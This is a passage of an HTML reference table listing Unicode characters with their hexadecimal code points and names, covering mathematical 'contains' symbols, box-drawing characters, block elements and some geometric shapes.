<td style="text-align:center">CONTAINS WITH LONG HORIZONTAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⋻</td>
<td style="text-align:center">22FB</td>
<td style="text-align:center">CONTAINS WITH VERTICAL BAR AT END OF HORIZONTAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⋼</td>
<td style="text-align:center">22FC</td>
<td style="text-align:center">SMALL CONTAINS WITH VERTICAL BAR AT END OF HORIZONTAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">⋽</td>
<td style="text-align:center">22FD</td>
<td style="text-align:center">CONTAINS WITH OVERBAR</td>
</tr>
<tr>
<td style="text-align:center">⋾</td>
<td style="text-align:center">22FE</td>
<td style="text-align:center">SMALL CONTAINS WITH OVERBAR</td>
</tr>
<tr>
<td style="text-align:center">⋿</td>
<td style="text-align:center">22FF</td>
<td style="text-align:center">Z NOTATION BAG MEMBERSHIP</td>
</tr>
<tr>
<td style="text-align:center">─</td>
<td style="text-align:center">2500</td>
<td style="text-align:center">BOX DRAWINGS LIGHT HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">━</td>
<td style="text-align:center">2501</td>
<td style="text-align:center">BOX DRAWINGS HEAVY HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">│</td>
<td style="text-align:center">2502</td>
<td style="text-align:center">BOX DRAWINGS LIGHT VERTICAL</td>
</tr>
<tr>
<td style="text-align:center">┃</td>
<td style="text-align:center">2503</td>
<td style="text-align:center">BOX DRAWINGS HEAVY VERTICAL</td>
</tr>
<tr>
<td style="text-align:center">┄</td>
<td style="text-align:center">2504</td>
<td style="text-align:center">BOX DRAWINGS LIGHT TRIPLE DASH HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">┅</td>
<td style="text-align:center">2505</td>
<td style="text-align:center">BOX DRAWINGS HEAVY TRIPLE DASH HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">┆</td>
<td style="text-align:center">2506</td>
<td style="text-align:center">BOX DRAWINGS LIGHT TRIPLE DASH VERTICAL</td>
</tr>
<tr>
<td style="text-align:center">┇</td>
<td style="text-align:center">2507</td>
<td style="text-align:center">BOX DRAWINGS HEAVY TRIPLE DASH VERTICAL</td>
</tr>
<tr>
<td style="text-align:center">┈</td>
<td style="text-align:center">2508</td>
<td style="text-align:center">BOX DRAWINGS LIGHT QUADRUPLE DASH HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">┉</td>
<td style="text-align:center">2509</td>
<td style="text-align:center">BOX DRAWINGS HEAVY QUADRUPLE DASH HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">┊</td>
<td style="text-align:center">250A</td>
<td style="text-align:center">BOX DRAWINGS LIGHT QUADRUPLE DASH VERTICAL</td>
</tr>
<tr>
<td style="text-align:center">┋</td>
<td style="text-align:center">250B</td>
<td style="text-align:center">BOX DRAWINGS HEAVY QUADRUPLE DASH VERTICAL</td>
</tr>
<tr>
<td style="text-align:center">┌</td>
<td style="text-align:center">250C</td>
<td style="text-align:center">BOX DRAWINGS LIGHT DOWN AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">┍</td>
<td style="text-align:center">250D</td>
<td style="text-align:center">BOX DRAWINGS DOWN LIGHT AND RIGHT HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┎</td>
<td style="text-align:center">250E</td>
<td style="text-align:center">BOX DRAWINGS DOWN HEAVY AND RIGHT LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┏</td>
<td style="text-align:center">250F</td>
<td style="text-align:center">BOX DRAWINGS HEAVY DOWN AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">┐</td>
<td style="text-align:center">2510</td>
<td style="text-align:center">BOX DRAWINGS LIGHT DOWN AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">┑</td>
<td style="text-align:center">2511</td>
<td style="text-align:center">BOX DRAWINGS DOWN LIGHT AND LEFT HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┒</td>
<td style="text-align:center">2512</td>
<td style="text-align:center">BOX DRAWINGS DOWN HEAVY AND LEFT LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┓</td>
<td style="text-align:center">2513</td>
<td style="text-align:center">BOX DRAWINGS HEAVY DOWN AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">└</td>
<td style="text-align:center">2514</td>
<td style="text-align:center">BOX DRAWINGS LIGHT UP AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">┕</td>
<td style="text-align:center">2515</td>
<td style="text-align:center">BOX DRAWINGS UP LIGHT AND RIGHT HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┖</td>
<td style="text-align:center">2516</td>
<td style="text-align:center">BOX DRAWINGS UP HEAVY AND RIGHT LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┗</td>
<td style="text-align:center">2517</td>
<td style="text-align:center">BOX DRAWINGS HEAVY UP AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">┘</td>
<td style="text-align:center">2518</td>
<td style="text-align:center">BOX DRAWINGS LIGHT UP AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">┙</td>
<td style="text-align:center">2519</td>
<td style="text-align:center">BOX DRAWINGS UP LIGHT AND LEFT HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┚</td>
<td style="text-align:center">251A</td>
<td style="text-align:center">BOX DRAWINGS UP HEAVY AND LEFT LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┛</td>
<td style="text-align:center">251B</td>
<td style="text-align:center">BOX DRAWINGS HEAVY UP AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">├</td>
<td style="text-align:center">251C</td>
<td style="text-align:center">BOX DRAWINGS LIGHT VERTICAL AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">┝</td>
<td style="text-align:center">251D</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL LIGHT AND RIGHT HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┞</td>
<td style="text-align:center">251E</td>
<td style="text-align:center">BOX DRAWINGS UP HEAVY AND RIGHT DOWN LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┟</td>
<td style="text-align:center">251F</td>
<td style="text-align:center">BOX DRAWINGS DOWN HEAVY AND RIGHT UP LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┠</td>
<td style="text-align:center">2520</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL HEAVY AND RIGHT LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┡</td>
<td style="text-align:center">2521</td>
<td style="text-align:center">BOX DRAWINGS DOWN LIGHT AND RIGHT UP HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┢</td>
<td style="text-align:center">2522</td>
<td style="text-align:center">BOX DRAWINGS UP LIGHT AND RIGHT DOWN HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┣</td>
<td style="text-align:center">2523</td>
<td style="text-align:center">BOX DRAWINGS HEAVY VERTICAL AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">┤</td>
<td style="text-align:center">2524</td>
<td style="text-align:center">BOX DRAWINGS LIGHT VERTICAL AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">┥</td>
<td style="text-align:center">2525</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL LIGHT AND LEFT HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┦</td>
<td style="text-align:center">2526</td>
<td style="text-align:center">BOX DRAWINGS UP HEAVY AND LEFT DOWN LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┧</td>
<td style="text-align:center">2527</td>
<td style="text-align:center">BOX DRAWINGS DOWN HEAVY AND LEFT UP LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┨</td>
<td style="text-align:center">2528</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL HEAVY AND LEFT LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┩</td>
<td style="text-align:center">2529</td>
<td style="text-align:center">BOX DRAWINGS DOWN LIGHT AND LEFT UP HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┪</td>
<td style="text-align:center">252A</td>
<td style="text-align:center">BOX DRAWINGS UP LIGHT AND LEFT DOWN HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┫</td>
<td style="text-align:center">252B</td>
<td style="text-align:center">BOX DRAWINGS HEAVY VERTICAL AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">┬</td>
<td style="text-align:center">252C</td>
<td style="text-align:center">BOX DRAWINGS LIGHT DOWN AND HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">┭</td>
<td style="text-align:center">252D</td>
<td style="text-align:center">BOX DRAWINGS LEFT HEAVY AND RIGHT DOWN LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┮</td>
<td style="text-align:center">252E</td>
<td style="text-align:center">BOX DRAWINGS RIGHT HEAVY AND LEFT DOWN LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┯</td>
<td style="text-align:center">252F</td>
<td style="text-align:center">BOX DRAWINGS DOWN LIGHT AND HORIZONTAL HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┰</td>
<td style="text-align:center">2530</td>
<td style="text-align:center">BOX DRAWINGS DOWN HEAVY AND HORIZONTAL LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┱</td>
<td style="text-align:center">2531</td>
<td style="text-align:center">BOX DRAWINGS RIGHT LIGHT AND LEFT DOWN HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┲</td>
<td style="text-align:center">2532</td>
<td style="text-align:center">BOX DRAWINGS LEFT LIGHT AND RIGHT DOWN HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┳</td>
<td style="text-align:center">2533</td>
<td style="text-align:center">BOX DRAWINGS HEAVY DOWN AND HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">┴</td>
<td style="text-align:center">2534</td>
<td style="text-align:center">BOX DRAWINGS LIGHT UP AND HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">┵</td>
<td style="text-align:center">2535</td>
<td style="text-align:center">BOX DRAWINGS LEFT HEAVY AND RIGHT UP LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┶</td>
<td style="text-align:center">2536</td>
<td style="text-align:center">BOX DRAWINGS RIGHT HEAVY AND LEFT UP LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┷</td>
<td style="text-align:center">2537</td>
<td style="text-align:center">BOX DRAWINGS UP LIGHT AND HORIZONTAL HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┸</td>
<td style="text-align:center">2538</td>
<td style="text-align:center">BOX DRAWINGS UP HEAVY AND HORIZONTAL LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┹</td>
<td style="text-align:center">2539</td>
<td style="text-align:center">BOX DRAWINGS RIGHT LIGHT AND LEFT UP HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┺</td>
<td style="text-align:center">253A</td>
<td style="text-align:center">BOX DRAWINGS LEFT LIGHT AND RIGHT UP HEAVY</td>
</tr>
<tr>
<td style="text-align:center">┻</td>
<td style="text-align:center">253B</td>
<td style="text-align:center">BOX DRAWINGS HEAVY UP AND HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">┼</td>
<td style="text-align:center">253C</td>
<td style="text-align:center">BOX DRAWINGS LIGHT VERTICAL AND HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">┽</td>
<td style="text-align:center">253D</td>
<td style="text-align:center">BOX DRAWINGS LEFT HEAVY AND RIGHT VERTICAL LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┾</td>
<td style="text-align:center">253E</td>
<td style="text-align:center">BOX DRAWINGS RIGHT HEAVY AND LEFT VERTICAL LIGHT</td>
</tr>
<tr>
<td style="text-align:center">┿</td>
<td style="text-align:center">253F</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL LIGHT AND HORIZONTAL HEAVY</td>
</tr>
<tr>
<td style="text-align:center">╀</td>
<td style="text-align:center">2540</td>
<td style="text-align:center">BOX DRAWINGS UP HEAVY AND DOWN HORIZONTAL LIGHT</td>
</tr>
<tr>
<td style="text-align:center">╁</td>
<td style="text-align:center">2541</td>
<td style="text-align:center">BOX DRAWINGS DOWN HEAVY AND UP HORIZONTAL LIGHT</td>
</tr>
<tr>
<td style="text-align:center">╂</td>
<td style="text-align:center">2542</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL HEAVY AND HORIZONTAL LIGHT</td>
</tr>
<tr>
<td style="text-align:center">╃</td>
<td style="text-align:center">2543</td>
<td style="text-align:center">BOX DRAWINGS LEFT UP HEAVY AND RIGHT DOWN LIGHT</td>
</tr>
<tr>
<td style="text-align:center">╄</td>
<td style="text-align:center">2544</td>
<td style="text-align:center">BOX DRAWINGS RIGHT UP HEAVY AND LEFT DOWN LIGHT</td>
</tr>
<tr>
<td style="text-align:center">╅</td>
<td style="text-align:center">2545</td>
<td style="text-align:center">BOX DRAWINGS LEFT DOWN HEAVY AND RIGHT UP LIGHT</td>
</tr>
<tr>
<td style="text-align:center">╆</td>
<td style="text-align:center">2546</td>
<td style="text-align:center">BOX DRAWINGS RIGHT DOWN HEAVY AND LEFT UP LIGHT</td>
</tr>
<tr>
<td style="text-align:center">╇</td>
<td style="text-align:center">2547</td>
<td style="text-align:center">BOX DRAWINGS DOWN LIGHT AND UP HORIZONTAL HEAVY</td>
</tr>
<tr>
<td style="text-align:center">╈</td>
<td style="text-align:center">2548</td>
<td style="text-align:center">BOX DRAWINGS UP LIGHT AND DOWN HORIZONTAL HEAVY</td>
</tr>
<tr>
<td style="text-align:center">╉</td>
<td style="text-align:center">2549</td>
<td style="text-align:center">BOX DRAWINGS RIGHT LIGHT AND LEFT VERTICAL HEAVY</td>
</tr>
<tr>
<td style="text-align:center">╊</td>
<td style="text-align:center">254A</td>
<td style="text-align:center">BOX DRAWINGS LEFT LIGHT AND RIGHT VERTICAL HEAVY</td>
</tr>
<tr>
<td style="text-align:center">╋</td>
<td style="text-align:center">254B</td>
<td style="text-align:center">BOX DRAWINGS HEAVY VERTICAL AND HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">╌</td>
<td style="text-align:center">254C</td>
<td style="text-align:center">BOX DRAWINGS LIGHT DOUBLE DASH HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">╍</td>
<td style="text-align:center">254D</td>
<td style="text-align:center">BOX DRAWINGS HEAVY DOUBLE DASH HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">╎</td>
<td style="text-align:center">254E</td>
<td style="text-align:center">BOX DRAWINGS LIGHT DOUBLE DASH VERTICAL</td>
</tr>
<tr>
<td style="text-align:center">╏</td>
<td style="text-align:center">254F</td>
<td style="text-align:center">BOX DRAWINGS HEAVY DOUBLE DASH VERTICAL</td>
</tr>
<tr>
<td style="text-align:center">═</td>
<td style="text-align:center">2550</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">║</td>
<td style="text-align:center">2551</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE VERTICAL</td>
</tr>
<tr>
<td style="text-align:center">╒</td>
<td style="text-align:center">2552</td>
<td style="text-align:center">BOX DRAWINGS DOWN SINGLE AND RIGHT DOUBLE</td>
</tr>
<tr>
<td style="text-align:center">╓</td>
<td style="text-align:center">2553</td>
<td style="text-align:center">BOX DRAWINGS DOWN DOUBLE AND RIGHT SINGLE</td>
</tr>
<tr>
<td style="text-align:center">╔</td>
<td style="text-align:center">2554</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE DOWN AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╕</td>
<td style="text-align:center">2555</td>
<td style="text-align:center">BOX DRAWINGS DOWN SINGLE AND LEFT DOUBLE</td>
</tr>
<tr>
<td style="text-align:center">╖</td>
<td style="text-align:center">2556</td>
<td style="text-align:center">BOX DRAWINGS DOWN DOUBLE AND LEFT SINGLE</td>
</tr>
<tr>
<td style="text-align:center">╗</td>
<td style="text-align:center">2557</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE DOWN AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">╘</td>
<td style="text-align:center">2558</td>
<td style="text-align:center">BOX DRAWINGS UP SINGLE AND RIGHT DOUBLE</td>
</tr>
<tr>
<td style="text-align:center">╙</td>
<td style="text-align:center">2559</td>
<td style="text-align:center">BOX DRAWINGS UP DOUBLE AND RIGHT SINGLE</td>
</tr>
<tr>
<td style="text-align:center">╚</td>
<td style="text-align:center">255A</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE UP AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╛</td>
<td style="text-align:center">255B</td>
<td style="text-align:center">BOX DRAWINGS UP SINGLE AND LEFT DOUBLE</td>
</tr>
<tr>
<td style="text-align:center">╜</td>
<td style="text-align:center">255C</td>
<td style="text-align:center">BOX DRAWINGS UP DOUBLE AND LEFT SINGLE</td>
</tr>
<tr>
<td style="text-align:center">╝</td>
<td style="text-align:center">255D</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE UP AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">╞</td>
<td style="text-align:center">255E</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL SINGLE AND RIGHT DOUBLE</td>
</tr>
<tr>
<td style="text-align:center">╟</td>
<td style="text-align:center">255F</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL DOUBLE AND RIGHT SINGLE</td>
</tr>
<tr>
<td style="text-align:center">╠</td>
<td style="text-align:center">2560</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE VERTICAL AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╡</td>
<td style="text-align:center">2561</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL SINGLE AND LEFT DOUBLE</td>
</tr>
<tr>
<td style="text-align:center">╢</td>
<td style="text-align:center">2562</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL DOUBLE AND LEFT SINGLE</td>
</tr>
<tr>
<td style="text-align:center">╣</td>
<td style="text-align:center">2563</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE VERTICAL AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">╤</td>
<td style="text-align:center">2564</td>
<td style="text-align:center">BOX DRAWINGS DOWN SINGLE AND HORIZONTAL DOUBLE</td>
</tr>
<tr>
<td style="text-align:center">╥</td>
<td style="text-align:center">2565</td>
<td style="text-align:center">BOX DRAWINGS DOWN DOUBLE AND HORIZONTAL SINGLE</td>
</tr>
<tr>
<td style="text-align:center">╦</td>
<td style="text-align:center">2566</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE DOWN AND HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">╧</td>
<td style="text-align:center">2567</td>
<td style="text-align:center">BOX DRAWINGS UP SINGLE AND HORIZONTAL DOUBLE</td>
</tr>
<tr>
<td style="text-align:center">╨</td>
<td style="text-align:center">2568</td>
<td style="text-align:center">BOX DRAWINGS UP DOUBLE AND HORIZONTAL SINGLE</td>
</tr>
<tr>
<td style="text-align:center">╩</td>
<td style="text-align:center">2569</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE UP AND HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">╪</td>
<td style="text-align:center">256A</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL SINGLE AND HORIZONTAL DOUBLE</td>
</tr>
<tr>
<td style="text-align:center">╫</td>
<td style="text-align:center">256B</td>
<td style="text-align:center">BOX DRAWINGS VERTICAL DOUBLE AND HORIZONTAL SINGLE</td>
</tr>
<tr>
<td style="text-align:center">╬</td>
<td style="text-align:center">256C</td>
<td style="text-align:center">BOX DRAWINGS DOUBLE VERTICAL AND HORIZONTAL</td>
</tr>
<tr>
<td style="text-align:center">╭</td>
<td style="text-align:center">256D</td>
<td style="text-align:center">BOX DRAWINGS LIGHT ARC DOWN AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╮</td>
<td style="text-align:center">256E</td>
<td style="text-align:center">BOX DRAWINGS LIGHT ARC DOWN AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">╯</td>
<td style="text-align:center">256F</td>
<td style="text-align:center">BOX DRAWINGS LIGHT ARC UP AND LEFT</td>
</tr>
<tr>
<td style="text-align:center">╰</td>
<td style="text-align:center">2570</td>
<td style="text-align:center">BOX DRAWINGS LIGHT ARC UP AND RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╱</td>
<td style="text-align:center">2571</td>
<td style="text-align:center">BOX DRAWINGS LIGHT DIAGONAL UPPER RIGHT TO LOWER LEFT</td>
</tr>
<tr>
<td style="text-align:center">╲</td>
<td style="text-align:center">2572</td>
<td style="text-align:center">BOX DRAWINGS LIGHT DIAGONAL UPPER LEFT TO LOWER RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╳</td>
<td style="text-align:center">2573</td>
<td style="text-align:center">BOX DRAWINGS LIGHT DIAGONAL CROSS</td>
</tr>
<tr>
<td style="text-align:center">╴</td>
<td style="text-align:center">2574</td>
<td style="text-align:center">BOX DRAWINGS LIGHT LEFT</td>
</tr>
<tr>
<td style="text-align:center">╵</td>
<td style="text-align:center">2575</td>
<td style="text-align:center">BOX DRAWINGS LIGHT UP</td>
</tr>
<tr>
<td style="text-align:center">╶</td>
<td style="text-align:center">2576</td>
<td style="text-align:center">BOX DRAWINGS LIGHT RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╷</td>
<td style="text-align:center">2577</td>
<td style="text-align:center">BOX DRAWINGS LIGHT DOWN</td>
</tr>
<tr>
<td style="text-align:center">╸</td>
<td style="text-align:center">2578</td>
<td style="text-align:center">BOX DRAWINGS HEAVY LEFT</td>
</tr>
<tr>
<td style="text-align:center">╹</td>
<td style="text-align:center">2579</td>
<td style="text-align:center">BOX DRAWINGS HEAVY UP</td>
</tr>
<tr>
<td style="text-align:center">╺</td>
<td style="text-align:center">257A</td>
<td style="text-align:center">BOX DRAWINGS HEAVY RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╻</td>
<td style="text-align:center">257B</td>
<td style="text-align:center">BOX DRAWINGS HEAVY DOWN</td>
</tr>
<tr>
<td style="text-align:center">╼</td>
<td style="text-align:center">257C</td>
<td style="text-align:center">BOX DRAWINGS LIGHT LEFT AND HEAVY RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╽</td>
<td style="text-align:center">257D</td>
<td style="text-align:center">BOX DRAWINGS LIGHT UP AND HEAVY DOWN</td>
</tr>
<tr>
<td style="text-align:center">╾</td>
<td style="text-align:center">257E</td>
<td style="text-align:center">BOX DRAWINGS HEAVY LEFT AND LIGHT RIGHT</td>
</tr>
<tr>
<td style="text-align:center">╿</td>
<td style="text-align:center">257F</td>
<td style="text-align:center">BOX DRAWINGS HEAVY UP AND LIGHT DOWN</td>
</tr>
<tr>
<td style="text-align:center">▀</td>
<td style="text-align:center">2580</td>
<td style="text-align:center">UPPER HALF BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▁</td>
<td style="text-align:center">2581</td>
<td style="text-align:center">LOWER ONE EIGHTH BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▂</td>
<td style="text-align:center">2582</td>
<td style="text-align:center">LOWER ONE QUARTER BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▃</td>
<td style="text-align:center">2583</td>
<td style="text-align:center">LOWER THREE EIGHTHS BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▄</td>
<td style="text-align:center">2584</td>
<td style="text-align:center">LOWER HALF BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▅</td>
<td style="text-align:center">2585</td>
<td style="text-align:center">LOWER FIVE EIGHTHS BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▆</td>
<td style="text-align:center">2586</td>
<td style="text-align:center">LOWER THREE QUARTERS BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▇</td>
<td style="text-align:center">2587</td>
<td style="text-align:center">LOWER SEVEN EIGHTHS BLOCK</td>
</tr>
<tr>
<td style="text-align:center">█</td>
<td style="text-align:center">2588</td>
<td style="text-align:center">FULL BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▉</td>
<td style="text-align:center">2589</td>
<td style="text-align:center">LEFT SEVEN EIGHTHS BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▊</td>
<td style="text-align:center">258A</td>
<td style="text-align:center">LEFT THREE QUARTERS BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▋</td>
<td style="text-align:center">258B</td>
<td style="text-align:center">LEFT FIVE EIGHTHS BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▌</td>
<td style="text-align:center">258C</td>
<td style="text-align:center">LEFT HALF BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▍</td>
<td style="text-align:center">258D</td>
<td style="text-align:center">LEFT THREE EIGHTHS BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▎</td>
<td style="text-align:center">258E</td>
<td style="text-align:center">LEFT ONE QUARTER BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▏</td>
<td style="text-align:center">258F</td>
<td style="text-align:center">LEFT ONE EIGHTH BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▐</td>
<td style="text-align:center">2590</td>
<td style="text-align:center">RIGHT HALF BLOCK</td>
</tr>
<tr>
<td style="text-align:center">░</td>
<td style="text-align:center">2591</td>
<td style="text-align:center">LIGHT SHADE</td>
</tr>
<tr>
<td style="text-align:center">▒</td>
<td style="text-align:center">2592</td>
<td style="text-align:center">MEDIUM SHADE</td>
</tr>
<tr>
<td style="text-align:center">▓</td>
<td style="text-align:center">2593</td>
<td style="text-align:center">DARK SHADE</td>
</tr>
<tr>
<td style="text-align:center">▔</td>
<td style="text-align:center">2594</td>
<td style="text-align:center">UPPER ONE EIGHTH BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▕</td>
<td style="text-align:center">2595</td>
<td style="text-align:center">RIGHT ONE EIGHTH BLOCK</td>
</tr>
<tr>
<td style="text-align:center">▖</td>
<td style="text-align:center">2596</td>
<td style="text-align:center">QUADRANT LOWER LEFT</td>
</tr>
<tr>
<td style="text-align:center">▗</td>
<td style="text-align:center">2597</td>
<td style="text-align:center">QUADRANT LOWER RIGHT</td>
</tr>
<tr>
<td style="text-align:center">▘</td>
<td style="text-align:center">2598</td>
<td style="text-align:center">QUADRANT UPPER LEFT</td>
</tr>
<tr>
<td style="text-align:center">▙</td>
<td style="text-align:center">2599</td>
<td style="text-align:center">QUADRANT UPPER LEFT AND LOWER LEFT AND LOWER RIGHT</td>
</tr>
<tr>
<td style="text-align:center">▚</td>
<td style="text-align:center">259A</td>
<td style="text-align:center">QUADRANT UPPER LEFT AND LOWER RIGHT</td>
</tr>
<tr>
<td style="text-align:center">▛</td>
<td style="text-align:center">259B</td>
<td style="text-align:center">QUADRANT UPPER LEFT AND UPPER RIGHT AND LOWER LEFT</td>
</tr>
<tr>
<td style="text-align:center">▜</td>
<td style="text-align:center">259C</td>
<td style="text-align:center">QUADRANT UPPER LEFT AND UPPER RIGHT AND LOWER RIGHT</td>
</tr>
<tr>
<td style="text-align:center">▝</td>
<td style="text-align:center">259D</td>
<td style="text-align:center">QUADRANT UPPER RIGHT</td>
</tr>
<tr>
<td style="text-align:center">▞</td>
<td style="text-align:center">259E</td>
<td style="text-align:center">QUADRANT UPPER RIGHT AND LOWER LEFT</td>
</tr>
<tr>
<td style="text-align:center">▟</td>
<td style="text-align:center">259F</td>
<td style="text-align:center">QUADRANT UPPER RIGHT AND LOWER LEFT AND LOWER RIGHT</td>
</tr>
<tr>
<td style="text-align:center">■</td>
<td style="text-align:center">25A0</td>
<td style="text-align:center">BLACK SQUARE</td>
</tr>
<tr>
<td style="text-align:center">□</td>
<td style="text-align:center">25A1</td>
<td style="text-align:center">WHITE SQUARE</td>
</tr>
<tr>
<td style="text-align:center">▢</td>
<td style="text-align:center">25A2</td>
<td style="text-align:center">WHITE SQUARE WITH ROUNDED CORNERS</td>
</tr>
<tr>
<td style="text-align:center">▣</td>
<td style="text-align:center">25A3</td>
<td style="text-align:center">WHITE SQUARE CONTAINING BLACK SMALL SQUARE</td>
</tr>
<tr>
<td style="text-align:center">▤</td>
<td style="text-align:center">25A4</td>
<td style="text-align:center">SQUARE WITH HORIZONTAL FILL</td>
</tr>
<tr>
<td style="text-align:center">▥</td>
<td style="text-align:center">25A5</td>
<td style="text-align:center">SQUARE WITH VERTICAL FILL</td>
</tr>
<tr>
<td style="text-align:center">▦</td>
<td style="text-align:center">25A6</td>
<td style="text-align:center">SQUARE WITH ORTHOGONAL CROSSHATCH FILL</td>
</tr>
<tr>
<td style="text-align:center">▧</td>
<td style="text-align:center">25A7</td>
<td style="text-align:center">SQUARE WITH UPPER LEFT TO LOWER RIGHT FILL</td>
</tr>
<tr>
<td style="text-align:center">▨</td>
<td style="text-align:center">25A8</td>
<td style="text-align:center">SQUARE WITH UPPER RIGHT TO LOWER LEFT FILL</td>
</tr>
<tr>
<td style="text-align:center">▩</td>
<td style="text-align:center">25A9</td>
<td style="text-align:center">SQUARE WITH DIAGONAL CROSSHATCH FILL</td>
</tr>
<tr>
<td style="text-align:center">▪</td>
<td style="text-align:center">25AA</td>
<td style="text-align:center">BLACK SMALL SQUARE</td>
</tr>
<tr>
<td style="text-align:center">▫</td>
<td style="text-align:center">25AB</td>
<td style="text-align:center">WHITE SMALL SQUARE</td>
</tr>
<tr>
<td style="text-align:center">▬</td>
<td style="text-align:center">25AC</td>
<td style="text-align:center">BLACK RECTANGLE</td>
</tr>
<tr>
<td style="text-align:center">▭</td>
<td style="text-align:center">25AD</td>
<td style="text-align:center">WHITE RECTANGLE</td>
</tr>
<tr>
<td style="text-align:center">▮</td>
<td style="text-align:center">25AE</td>
<td style="text-align:center">BLACK VERTICAL RECTANGLE</td>
